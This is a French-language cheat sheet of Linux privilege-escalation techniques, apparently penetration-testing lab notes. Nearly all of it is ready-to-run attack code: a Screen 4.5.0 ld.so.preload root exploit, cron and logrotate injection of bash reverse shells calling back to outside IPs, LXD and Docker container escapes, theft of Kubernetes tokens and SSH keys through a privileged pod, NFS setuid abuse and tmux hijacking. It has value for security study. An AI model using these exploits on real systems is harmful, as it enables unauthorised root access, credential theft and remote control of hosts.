### Vulnerable Services
> Exploiter des services vulnérables comme Screen 4.5.0

```bash
# Exploiter Screen 4.5.0
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
cd /etc
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
```
### Cron Job Abuse
> Exploiter des tâches cron mal configurées

```bash
# Trouver des fichiers de backup script exécutés par cron
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Injecter un reverse shell dans un script cron
echo "bash -i >& /dev/tcp/10.10.14.3/443 0>&1" >> /dmz-backups/backup.sh
```
### Container Escape
> S'échapper de conteneurs mal configurés
#### LXC/LXD Escape
```bash
# Créer un conteneur qui monte le système de fichiers hôte
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```
#### Docker Escape
```bash
# Utiliser un socket Docker exposé
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem ubuntu
/tmp/docker -H unix:///app/docker.sock exec -it [CONTAINER_ID] /bin/bash
```
### Kubernetes Abuse
> Exploiter des clusters Kubernetes mal configurés

```bash
# Extraire des tokens Kubernetes
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx > k8.token
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx > ca.crt

# Vérifier les droits
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

# Créer un pod privilégié
cat > privesc.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
EOF

kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 apply -f privesc.yaml
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```
### Logrotate Exploitation
> Exploiter logrotate pour élever les privilèges

```bash
# Compiler l'exploit logrotten
gcc logrotten.c -o logrotten

# Créer un payload reverse shell
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

# Déterminer l'option utilisée dans logrotate.conf
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

# Exploiter
./logrotten -p ./payload /tmp/tmp.log
```
### NFS Privilege Escalation
> Exploiter des montages NFS avec no_root_squash

```bash
# Vérifier les montages NFS
showmount -e 10.129.2.12

# Créer un binaire setuid
cat << EOF > shell.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void) {
  setuid(0); setgid(0); system("/bin/bash");
}
EOF
gcc shell.c -o shell

# Monter le partage NFS et copier le binaire
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell

# Exécuter sur la cible
./shell
```
### Tmux Session Hijacking
> Détourner des sessions tmux avec des permissions faibles

```bash
# Chercher des processus tmux
ps aux | grep tmux

# Vérifier les permissions du socket
ls -la /shareds

# S'attacher à la session
tmux -S /shareds
```
